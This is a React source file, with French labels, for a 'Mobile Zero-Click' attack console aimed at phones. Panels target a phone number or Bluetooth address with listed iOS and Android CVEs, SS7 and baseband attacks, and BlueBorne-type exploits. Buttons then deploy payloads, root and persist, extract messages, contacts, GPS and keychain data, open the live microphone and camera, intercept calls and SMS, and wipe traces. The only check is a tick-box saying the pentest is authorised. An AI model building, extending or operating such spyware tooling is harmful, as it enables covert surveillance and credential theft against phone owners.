import { useState, useCallback } from 'react'
import { apiFetch } from '../../utils/auth'

const API = '/mobile'

const MODULES = [
  { id: 'ios',       label: 'iOS Zero-Click',    icon: '🍎', color: '#00bfff', subtitle: 'Pegasus-level' },
  { id: 'android',   label: 'Android Zero-Click', icon: '🤖', color: '#00ff88', subtitle: 'RCS/WebRTC/BT' },
  { id: 'baseband',  label: 'Baseband / SS7',    icon: '📡', color: '#ff8800', subtitle: 'Ring -1 modem' },
  { id: 'bluetooth', label: 'Bluetooth',         icon: '🔵', color: '#0088ff', subtitle: 'BlueBorne/BrakTooth' },
]

const IOS_CVE = ['CVE-2021-30860','CVE-2022-22620','CVE-2023-41991','CVE-2024-23225','CVE-2024-23296']
const IOS_VECTORS = ['imessage','webkit','facetime']
const ANDROID_CVE = ['CVE-2023-40088','CVE-2023-21282','CVE-2022-20345','CVE-2024-43093']
const ANDROID_VECTORS = ['rcs','webrtc','sms','bluetooth']
const SS7_ATTACKS = ['location_tracking','call_intercept','sms_intercept','call_forward','dos']
const BT_EXPLOITS = ['blueborne','sweyntooth','braktooth']

function JsonBox({ data, color }) {
  if (!data) return null
  return (
    <pre style={{
      background: '#060612', border: `1px solid ${color}33`, borderRadius: 6,
      padding: 10, fontSize: 10.5, color: '#a0ffa0', overflowY: 'auto',
      maxHeight: 260, margin: '8px 0', lineHeight: 1.45,
    }}>
      {JSON.stringify(data, null, 2)}
    </pre>
  )
}

function Btn({ label, onClick, color = '#0af', small }) {
  return (
    <button onClick={onClick} style={{
      background: color + '22', border: `1px solid ${color}66`, color,
      borderRadius: 4, padding: small ? '3px 8px' : '5px 12px',
      fontSize: small ? 10 : 11, cursor: 'pointer', margin: '2px',
    }}>{label}</button>
  )
}

// ─── iOS Panel ─────────────────────────────────────────────────────────────
function iOSPanel() {
  const [phone, setPhone] = useState('+33600000000')
  const [vector, setVector] = useState('imessage')
  const [cve, setCve] = useState('CVE-2021-30860')
  const [infId, setInfId] = useState('')
  const [auth, setAuth] = useState(false)
  const [res, setRes] = useState(null)
  const [loading, setLoading] = useState(false)

  const post = useCallback(async (path, body = {}) => {
    if (!auth) return alert('Cochez "autorisation confirmée"')
    setLoading(true)
    try {
      const r = await apiFetch(`${API}/${path}`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...body, authorization_confirmed: true }),
      })
      if (r.infection_id) setInfId(r.infection_id)
      setRes(r)
    } catch (e) { setRes({ error: e.message }) } finally { setLoading(false) }
  }, [auth])

  const get = useCallback(async (path) => {
    setLoading(true)
    try { setRes(await apiFetch(`${API}/${path}`)) }
    catch (e) { setRes({ error: e.message }) } finally { setLoading(false) }
  }, [])

  return (
    <div>
      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', marginBottom: 8 }}>
        <input value={phone} onChange={e => setPhone(e.target.value)}
          placeholder="+33600000000" style={inputStyle} />
        <select value={vector} onChange={e => setVector(e.target.value)} style={selectStyle}>
          {IOS_VECTORS.map(v => <option key={v}>{v}</option>)}
        </select>
        <select value={cve} onChange={e => setCve(e.target.value)} style={selectStyle}>
          {IOS_CVE.map(c => <option key={c}>{c}</option>)}
        </select>
      </div>
      <label style={authLabel}>
        <input type="checkbox" checked={auth} onChange={e => setAuth(e.target.checked)} />
        Pentest autorisé — je confirme
      </label>
      <div style={{ display: 'flex', flexWrap: 'wrap' }}>
        <Btn label="🎯 Payload"   onClick={() => post('ios/zero-click/payload', {target_phone:phone,vector,cve})} color="#00bfff" />
        <Btn label="🚀 Deploy"    onClick={() => post('ios/zero-click/deploy', {target_phone:phone,vector,cve})} color="#ff4444" />
        {infId && <>
          <Btn label="📊 Status"  onClick={() => get(`ios/zero-click/status?infection_id=${infId}`)} color="#0af" />
          <Btn label="🔒 Persist" onClick={() => post('ios/persistence/profile', {infection_id:infId,method:'mobileconfig'})} color="#cc00ff" />
          <Btn label="📇 Contacts" onClick={() => post('ios/extract/contacts',{infection_id:infId})} color="#0f8" />
          <Btn label="💬 Messages" onClick={() => post('ios/extract/messages',{infection_id:infId})} color="#0f8" />
          <Btn label="📍 GPS"     onClick={() => post('ios/extract/gps',{infection_id:infId})} color="#0f8" />
          <Btn label="🔑 Keychain" onClick={() => post('ios/extract/keychain',{infection_id:infId})} color="#ffcc00" />
          <Btn label="🎤 Mic"     onClick={() => post('ios/extract/mic',{infection_id:infId})} color="#ff8800" />
          <Btn label="📸 Cam"     onClick={() => post('ios/extract/camera',{infection_id:infId})} color="#ff8800" />
          <Btn label="🧹 Clean"   onClick={() => post('ios/clean',{infection_id:infId})} color="#888" />
        </>}
        <Btn label="📋 CVEs" onClick={() => get('ios/vulnerabilities')} color="#666" />
      </div>
      {loading && <div style={{color:'#666',fontSize:11}}>⏳ Requête...</div>}
      <JsonBox data={res} color="#00bfff" />
    </div>
  )
}

// ─── Android Panel ─────────────────────────────────────────────────────────
function AndroidPanel() {
  const [phone, setPhone] = useState('+33600000000')
  const [vector, setVector] = useState('rcs')
  const [cve, setCve] = useState('CVE-2023-40088')
  const [infId, setInfId] = useState('')
  const [auth, setAuth] = useState(false)
  const [res, setRes] = useState(null)
  const [loading, setLoading] = useState(false)

  const post = useCallback(async (path, body = {}) => {
    if (!auth) return alert('Cochez "autorisation confirmée"')
    setLoading(true)
    try {
      const r = await apiFetch(`${API}/${path}`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...body, authorization_confirmed: true }),
      })
      if (r.infection_id) setInfId(r.infection_id)
      setRes(r)
    } catch (e) { setRes({ error: e.message }) } finally { setLoading(false) }
  }, [auth])

  return (
    <div>
      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', marginBottom: 8 }}>
        <input value={phone} onChange={e => setPhone(e.target.value)}
          placeholder="+33600000000" style={inputStyle} />
        <select value={vector} onChange={e => setVector(e.target.value)} style={selectStyle}>
          {ANDROID_VECTORS.map(v => <option key={v}>{v}</option>)}
        </select>
        <select value={cve} onChange={e => setCve(e.target.value)} style={selectStyle}>
          {ANDROID_CVE.map(c => <option key={c}>{c}</option>)}
        </select>
      </div>
      <label style={authLabel}>
        <input type="checkbox" checked={auth} onChange={e => setAuth(e.target.checked)} />
        Pentest autorisé — je confirme
      </label>
      <div style={{ display: 'flex', flexWrap: 'wrap' }}>
        <Btn label="🎯 Payload"   onClick={() => post('android/zero-click/payload', {target_phone:phone,vector,cve})} color="#00ff88" />
        <Btn label="🚀 Deploy"    onClick={() => post('android/zero-click/deploy', {target_phone:phone,vector,cve})} color="#ff4444" />
        {infId && <>
          <Btn label="📊 Status"   onClick={() => post('android/zero-click/status',{infection_id:infId})} color="#0af" />
          <Btn label="⬆️ Root"    onClick={() => post('android/root/exploit',{infection_id:infId})} color="#ff4444" />
          <Btn label="🔒 Persist"  onClick={() => post('android/persistence',{infection_id:infId,method:'system_app'})} color="#cc00ff" />
          <Btn label="📦 Extract All" onClick={() => post('android/extract/all',{infection_id:infId})} color="#0f8" />
          <Btn label="🎤 Mic"      onClick={() => post('android/mic/live',{infection_id:infId})} color="#ff8800" />
          <Btn label="📸 Cam"      onClick={() => post('android/camera/live',{infection_id:infId})} color="#ff8800" />
          <Btn label="🧹 Clean"    onClick={() => post('android/clean',{infection_id:infId})} color="#888" />
        </>}
      </div>
      {loading && <div style={{color:'#666',fontSize:11}}>⏳ Requête...</div>}
      <JsonBox data={res} color="#00ff88" />
    </div>
  )
}

// ─── Baseband Panel ─────────────────────────────────────────────────────────
function BasebandPanel() {
  const [target, setTarget] = useState('+33600000000')
  const [implantId, setImplantId] = useState('')
  const [attack, setAttack] = useState('location_tracking')
  const [auth, setAuth] = useState(false)
  const [res, setRes] = useState(null)
  const [loading, setLoading] = useState(false)

  const post = useCallback(async (path, body = {}) => {
    if (!auth) return alert('Cochez "autorisation confirmée"')
    setLoading(true)
    try {
      const r = await apiFetch(`${API}/${path}`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...body, authorization_confirmed: true }),
      })
      if (r.implant_id) setImplantId(r.implant_id)
      setRes(r)
    } catch (e) { setRes({ error: e.message }) } finally { setLoading(false) }
  }, [auth])

  return (
    <div>
      <input value={target} onChange={e => setTarget(e.target.value)}
        placeholder="+33600000000 ou description" style={{ ...inputStyle, marginBottom: 6 }} />
      <select value={attack} onChange={e => setAttack(e.target.value)} style={{ ...selectStyle, marginBottom: 8 }}>
        {SS7_ATTACKS.map(a => <option key={a}>{a}</option>)}
      </select>
      <label style={authLabel}>
        <input type="checkbox" checked={auth} onChange={e => setAuth(e.target.checked)} />
        Pentest autorisé — je confirme
      </label>
      <div style={{ display: 'flex', flexWrap: 'wrap' }}>
        <Btn label="🔍 Scan Chipset" onClick={() => post('baseband/scan', {target})} color="#ff8800" />
        <Btn label="💥 Exploit"      onClick={() => post('baseband/exploit', {target})} color="#ff4444" />
        <Btn label="📡 SS7 Attack"   onClick={() => post('baseband/ss7/attack', {msisdn:target,attack_type:attack})} color="#cc00ff" />
        {implantId && <>
          <Btn label="💬 SMS Intercept" onClick={() => post('baseband/sms/intercept',{implant_id:implantId})} color="#0f8" />
          <Btn label="📞 Call Intercept" onClick={() => post('baseband/call/intercept',{implant_id:implantId})} color="#0f8" />
          <Btn label="📍 GPS Spoof"      onClick={() => post('baseband/gps/spoof',{implant_id:implantId})} color="#ffcc00" />
          <Btn label="📉 2G Downgrade"   onClick={() => post('baseband/network/downgrade',{implant_id:implantId})} color="#888" />
        </>}
      </div>
      {loading && <div style={{color:'#666',fontSize:11}}>⏳ Requête...</div>}
      <JsonBox data={res} color="#ff8800" />
    </div>
  )
}

// ─── Bluetooth Panel ─────────────────────────────────────────────────────────
function BluetoothPanel() {
  const [mac, setMac] = useState('AA:BB:CC:DD:EE:FF')
  const [iface, setIface] = useState('hci0')
  const [exploit, setExploit] = useState('blueborne')
  const [auth, setAuth] = useState(false)
  const [res, setRes] = useState(null)
  const [loading, setLoading] = useState(false)

  const post = useCallback(async (path, body = {}) => {
    if (!auth) return alert('Cochez "autorisation confirmée"')
    setLoading(true)
    try { setRes(await apiFetch(`${API}/${path}`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...body, authorization_confirmed: true }),
    })) }
    catch (e) { setRes({ error: e.message }) } finally { setLoading(false) }
  }, [auth])

  const get = useCallback(async (path) => {
    setLoading(true)
    try { setRes(await apiFetch(`${API}/${path}`)) }
    catch (e) { setRes({ error: e.message }) } finally { setLoading(false) }
  }, [])

  return (
    <div>
      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', marginBottom: 8 }}>
        <input value={iface} onChange={e => setIface(e.target.value)}
          placeholder="hci0" style={{ ...inputStyle, maxWidth: 80 }} />
        <input value={mac} onChange={e => setMac(e.target.value)}
          placeholder="AA:BB:CC:DD:EE:FF" style={inputStyle} />
        <select value={exploit} onChange={e => setExploit(e.target.value)} style={selectStyle}>
          {BT_EXPLOITS.map(e => <option key={e}>{e}</option>)}
        </select>
      </div>
      <label style={authLabel}>
        <input type="checkbox" checked={auth} onChange={e => setAuth(e.target.checked)} />
        Pentest autorisé — je confirme
      </label>
      <div style={{ display: 'flex', flexWrap: 'wrap' }}>
        <Btn label="📋 Liste Exploits" onClick={() => get('bluetooth/exploits')} color="#666" />
        <Btn label="🔍 Scan BT"  onClick={() => post('bluetooth/scan', {interface:iface})} color="#0088ff" />
        <Btn label={`💥 ${exploit}`} onClick={() => post(`bluetooth/exploit/${exploit}`, {target_mac:mac})} color="#ff4444" />
        <Btn label="📡 Sniff"    onClick={() => post('bluetooth/sniff', {interface:iface})} color="#888" />
      </div>
      {loading && <div style={{color:'#666',fontSize:11}}>⏳ Requête...</div>}
      <JsonBox data={res} color="#0088ff" />
    </div>
  )
}

// ─── Styles ─────────────────────────────────────────────────────────────────
const inputStyle = {
  background: '#111', border: '1px solid #333', color: '#ccc',
  borderRadius: 4, padding: '4px 8px', fontSize: 11, flex: 1, minWidth: 140,
}
const selectStyle = {
  background: '#111', border: '1px solid #333', color: '#ccc',
  borderRadius: 4, padding: '4px 6px', fontSize: 11,
}
const authLabel = {
  fontSize: 11, color: '#ff8888', display: 'flex', gap: 6,
  marginBottom: 8, cursor: 'pointer', alignItems: 'center',
}

const PANELS = { ios: iOSPanel, android: AndroidPanel, baseband: BasebandPanel, bluetooth: BluetoothPanel }

export default function MobileZeroClick() {
  const [tab, setTab] = useState('ios')
  const Panel = PANELS[tab]
  const mod = MODULES.find(m => m.id === tab)

  return (
    <div style={{
      height: '100vh', overflowY: 'auto', padding: 20,
      background: 'linear-gradient(135deg, #050510 0%, #050520 100%)',
      color: '#c0c0e0', fontFamily: 'monospace',
    }}>
      <div style={{ marginBottom: 16 }}>
        <div style={{ fontSize: 22, fontWeight: 'bold', color: '#ff4444', letterSpacing: 2 }}>
          📱 MOBILE ZERO-CLICK — BLOC 1
        </div>
        <div style={{ fontSize: 12, color: '#666', marginTop: 4 }}>
          iOS (Pegasus) · Android (RCS/WebRTC) · Baseband SS7 · Bluetooth BlueBorne
        </div>
        <div style={{ fontSize: 11, color: '#ff4444', marginTop: 4, padding: '4px 8px', background: '#ff000011', borderRadius: 4, display: 'inline-block' }}>
          ⚠️ Usage exclusivement légal — pentest autorisé uniquement
        </div>
      </div>

      {/* Module cards */}
      <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', marginBottom: 16 }}>
        {MODULES.map(m => (
          <button key={m.id} onClick={() => setTab(m.id)} style={{
            background: tab === m.id ? m.color + '22' : '#0d0d1f',
            border: `1px solid ${m.color}${tab === m.id ? '88' : '33'}`,
            color: m.color, borderRadius: 6, padding: '8px 14px',
            cursor: 'pointer', fontSize: 12,
          }}>
            <div>{m.icon} {m.label}</div>
            <div style={{ color: '#666', fontSize: 10 }}>{m.subtitle}</div>
          </button>
        ))}
      </div>

      {/* Active panel */}
      <div style={{
        background: '#0d0d1f', border: `1px solid ${mod?.color || '#333'}44`,
        borderRadius: 8, padding: 16,
      }}>
        <div style={{ color: mod?.color, fontWeight: 'bold', fontSize: 14, marginBottom: 12 }}>
          {mod?.icon} {mod?.label}
        </div>
        <Panel />
      </div>
    </div>
  )
}
